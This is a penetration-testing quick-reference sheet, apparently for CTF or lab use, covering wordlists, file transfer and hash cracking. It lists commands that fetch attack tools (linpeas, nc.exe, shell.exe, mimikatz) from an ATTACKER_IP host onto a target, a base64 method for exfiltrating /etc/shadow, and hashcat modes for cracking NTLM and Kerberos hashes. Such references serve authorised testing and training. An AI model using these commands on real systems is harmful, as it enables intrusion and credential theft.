# 📋 Quick Reference

Wordlists, file transfer methods, and hash cracking cheat sheet.

---

## WORDLISTS

### /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

```bash
Go-to for gobuster
```

<details>
<summary>Example Output</summary>

```
wc -l directory-list-2.3-medium.txt
220560 lines
Used for: gobuster, feroxbuster, ffuf
(Default go-to wordlist for directory brute forcing)
```
</details>

---

### /usr/share/wordlists/rockyou.txt

```bash
Standard password list
```

<details>
<summary>Example Output</summary>

```
wc -l rockyou.txt
14344392 lines
Used for: john, hashcat, hydra
(Default password cracking wordlist)
```
</details>

---

### /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

```bash
Good alternative wordlist
```

<details>
<summary>Example Output</summary>

```
wc -l raft-medium-directories.txt
30000 lines
Used for: directory brute force
(Alternative to dirbuster, catches different paths)
```
</details>

---

### /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

```bash
Subdomain / vhost scanning
```

<details>
<summary>Example Output</summary>

```
wc -l subdomains-top1million-5000.txt
4997 lines
Used for: gobuster dns, ffuf vhost
(Fast subdomain enumeration wordlist)
```
</details>

---

### /usr/share/seclists/Usernames/Names/names.txt

```bash
Common first names
```

<details>
<summary>Example Output</summary>

```
wc -l names.txt
10177 lines
Used for: SMTP user enum, SSH brute force
(Common first names as usernames)
```
</details>

---

### /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt

```bash
SNMP brute force
```

<details>
<summary>Example Output</summary>

```
Contents: public, private, community, manager, cisco...
Used for: onesixtyone, snmpwalk
(Common SNMP community strings)
```
</details>

---

### /usr/share/seclists/

```bash
Install: apt install seclists
```

<details>
<summary>Example Output</summary>

```
ls /usr/share/seclists/
Discovery/  Fuzzing/  Passwords/  Usernames/
Web-Content/  DNS/  SNMP/  Payloads/
(Massive collection - explore all subdirs)
```
</details>

---

## FILE TRANSFER METHODS

### python3 -m http.server 80

```bash
Host files on attacker machine
```

<details>
<summary>Example Output</summary>

```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80

On target: wget http://ATTACKER_IP/linpeas.sh
(Simplest file transfer, always works)
```
</details>

---

### wget http://ATTACKER_IP/file -O /tmp/file

```bash
Download to target
```

<details>
<summary>Example Output</summary>

```
wget http://10.10.14.2/linpeas.sh -O /tmp/linpeas.sh
--2026-02-24 10:00:00-- Connecting... connected.
HTTP request sent, 200 OK
Saved: '/tmp/linpeas.sh' [82321]
```
</details>

---

### curl http://ATTACKER_IP/file -o /tmp/file

```bash
Alternative download
```

<details>
<summary>Example Output</summary>

```
curl http://10.10.14.2/chisel -o /tmp/chisel
% Total  % Received
100 8.2M  100 8.2M  0  0  52.1M  0
(Use -o for output file, -O to keep original name)
```
</details>

---

### certutil -urlcache -split -f http://ATTACKER_IP/file C:\Temp\file

```bash
Windows built-in
```

<details>
<summary>Example Output</summary>

```
certutil -urlcache -split -f http://10.10.14.2/nc.exe C:\Temp\nc.exe
****  Online  ****
CertUtil: -URLCache command completed.
(Windows built-in, rarely blocked by AV)
```
</details>

---

### Invoke-WebRequest -Uri http://ATTACKER_IP/file -OutFile C:\Temp\file

```bash
Or: iwr -uri URL -o file
```

<details>
<summary>Example Output</summary>

```
IWR -Uri http://10.10.14.2/shell.exe -OutFile C:\Temp\shell.exe
OR: (New-Object Net.WebClient).DownloadFile('http://10.10.14.2/shell.exe','C:\Temp\shell.exe')
(PowerShell - use if certutil is blocked)
```
</details>

---

### impacket-smbserver share . -smb2support

```bash
Host SMB share
```

<details>
<summary>Example Output</summary>

```
impacket-smbserver share . -smb2support
[*] Config file parsed
[*] Callback added for UUID 4B324FC8
Impacket SMB server running...
(Host files via SMB for Windows targets)
```
</details>

---

### copy \\ATTACKER_IP\share\file C:\Temp\file

```bash
Copy from your SMB share
```

<details>
<summary>Example Output</summary>

```
copy \\10.10.14.2\share\mimikatz.exe C:\Temp\
1 file(s) copied.
(Fetch from SMB server, good when HTTP is blocked)
```
</details>

---

### Attacker: nc -nlvp 4444 &lt; file
Target: nc ATTACKER_IP 4444 &gt; file

```bash
If nothing else works
```

<details>
<summary>Example Output</summary>

```
Attacker: nc -nlvp 4444 < linpeas.sh
Target:   nc 10.10.14.2 4444 > /tmp/linpeas.sh

(Raw TCP transfer, no HTTP needed)
(Works when wget/curl unavailable)
```
</details>

---

### base64 file &gt; encoded.txt
(copy text)
echo '&lt;text&gt;' | base64 -d &gt; file

```bash
When all transfers are blocked
```

<details>
<summary>Example Output</summary>

```
On target:
base64 /etc/shadow
cm9vdDokNiRhYmMx...

On attacker:
echo 'cm9vdDokNiRhYmMx...' | base64 -d > shadow
(Exfiltrate files through copy-paste when no network)
```
</details>

---

## HASH CRACKING

### hashid '&lt;hash&gt;'
hash-identifier

```bash
First step before cracking
```

<details>
<summary>Example Output</summary>

```
hashid '$6$rounds=5000$salt$hash'
[+] SHA-512 Crypt

hash-identifier
Possible Hashs:
[+] SHA-512 Crypt
(Identify hash type before cracking)
```
</details>

---

### john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

```bash
General purpose cracker
```

<details>
<summary>Example Output</summary>

```
john --wordlist=rockyou.txt hash.txt
Loaded 1 password hash (sha512crypt)
Press 'q' to abort
admin123  (admin)
Session completed
(john auto-detects hash type)
```
</details>

---

### hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

```bash
-m 0 = MD5
```

<details>
<summary>Example Output</summary>

```
hashcat -m 0 hash.txt rockyou.txt
Hashcat v6.2.6
$HEX[...]:password123
Session: hashcat
Status: Cracked
(MD5 = mode 0, fastest to crack)
```
</details>

---

### hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt

```bash
-m 1400 = SHA256
```

<details>
<summary>Example Output</summary>

```
hashcat -m 1400 hash.txt rockyou.txt
SHA-256 hash cracked:
abc123def...:Summer2024
(SHA-256 = mode 1400)
```
</details>

---

### hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt

```bash
-m 1000 = NTLM
```

<details>
<summary>Example Output</summary>

```
hashcat -m 1000 hash.txt rockyou.txt
NTLM hash cracked:
31d6cfe0d16ae931b...:Password1
(NTLM = mode 1000, very fast to crack)
```
</details>

---

### hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

```bash
-m 5600 = NTLMv2
```

<details>
<summary>Example Output</summary>

```
hashcat -m 5600 hash.txt rockyou.txt
NTLMv2 hash cracked:
john::CORP:abc123...:Welcome2024!
(NTLMv2 = mode 5600, captured from Responder)
```
</details>

---

### hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

```bash
-m 3200 = bcrypt (slow)
```

<details>
<summary>Example Output</summary>

```
hashcat -m 3200 hash.txt rockyou.txt
bcrypt hash cracked:
$2y$10$abc...:monkey123
(bcrypt = mode 3200, SLOW - use rules not full wordlist)
```
</details>

---

### hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt

```bash
-m 13100 = TGS-REP
```

<details>
<summary>Example Output</summary>

```
hashcat -m 13100 hash.txt rockyou.txt
Kerberoast TGS hash cracked:
$krb5tgs$23$*svc_sql*...:SQLServiceP@ss!
(Kerberoast = mode 13100)
```
</details>

---

### hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt

```bash
-m 18200 = AS-REP
```

<details>
<summary>Example Output</summary>

```
hashcat -m 18200 hash.txt rockyou.txt
AS-REP hash cracked:
$krb5asrep$23$svc_backup...:Backup2024!
(AS-REP = mode 18200)
```
</details>

---

### https://crackstation.net/

```bash
Quick check for common hashes
```

<details>
<summary>Example Output</summary>

```
Paste hash into https://crackstation.net/
Result: MD5 abc123... = 'password'
(Online rainbow tables, instant for common hashes)
(Only for non-sensitive/CTF hashes)
```
</details>

---
